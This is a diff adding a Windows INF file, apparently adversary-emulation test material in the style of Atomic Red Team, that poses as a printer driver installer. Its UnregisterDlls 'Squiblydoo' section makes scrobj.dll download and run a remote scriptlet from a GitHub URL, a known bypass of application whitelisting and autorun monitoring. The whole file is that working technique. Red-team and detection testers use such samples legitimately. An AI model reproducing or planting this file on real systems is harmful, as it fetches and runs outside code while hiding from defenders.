@@ -1,0 +1,32 @@
+; ----------------------------------------------------------------------
+; Required Sections
+; Reference: https://raw.githubusercontent.com/huntresslabs/evading-autoruns/master/shady.inf
+; ----------------------------------------------------------------------
+[Version]
+Signature=$CHICAGO$
+Provider=test
+Class=Printer
+
+[Manufacturer]
+HuntressLabs=ModelsSection,NTx86,NTia64,NTamd64
+
+; ----------------------------------------------------------------------
+; Models Section
+; ----------------------------------------------------------------------
+[ModelsSection.NTx86]
+UnregisterDlls = Squiblydoo
+
+[ModelsSection.NTia64]
+UnregisterDlls = Squiblydoo
+
+[ModelsSection.NTamd64]
+UnregisterDlls = Squiblydoo
+
+; ----------------------------------------------------------------------
+; Support Sections
+; ----------------------------------------------------------------------
+[DefaultInstall]
+UnregisterDlls = Squiblydoo
+
+[Squiblydoo]
+11,,scrobj.dll,2,60,https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/src/T1085.sct
